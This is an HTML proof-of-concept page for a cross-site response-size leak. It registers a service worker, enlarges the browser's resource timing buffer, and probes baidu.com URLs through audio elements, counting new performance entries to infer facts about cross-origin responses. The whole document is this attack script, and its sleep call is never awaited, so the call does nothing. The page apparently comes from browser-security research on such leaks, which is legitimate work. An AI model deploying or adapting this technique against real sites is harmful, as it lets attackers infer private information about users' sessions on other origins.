<!DOCTYPE html>
<html>
	<head>
		<title>Response size leak</title>
		<script>

      function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
      }

			if ("serviceWorker" in navigator) {
				addEventListener("load", async () => {
					performance.setResourceTimingBufferSize(1337);
					const registration = await navigator.serviceWorker.register("static/serviceworker.js");
					if (registration.installing)
						location.reload();
				});
			}

			function singleSizeCheck(url, size) {
				let start = performance.getEntries().length;
				let sound = document.createElement("audio");
				sound.src = `${url}?size=${size}&${Math.random()}`;
				return new Promise((resolve) => {
          sound.onload = () => {
            let diff = performance.getEntries().length - start;
            document.body.innerHTML += url + ' onload ' + diff + '<br>';
						return resolve(diff);
          }

					sound.onerror = () => {
						let diff = performance.getEntries().length - start;
            document.body.innerHTML += url + ' onerror ' + diff + '<br>';
						return resolve(diff);
					}
				});
			}
			
			onload = () => {
        sleep(100);
				singleSizeCheck("https://www.baidu.com/robots.txt", 1);
        singleSizeCheck("https://www.baidu.com/asdf", 1);
        singleSizeCheck("https://www.baidu.com/robots.txt", 1);
        singleSizeCheck("https://www.baidu.com/asdf", 1);
			}

    </script>
  </head>

  <body>
  </body>

</html>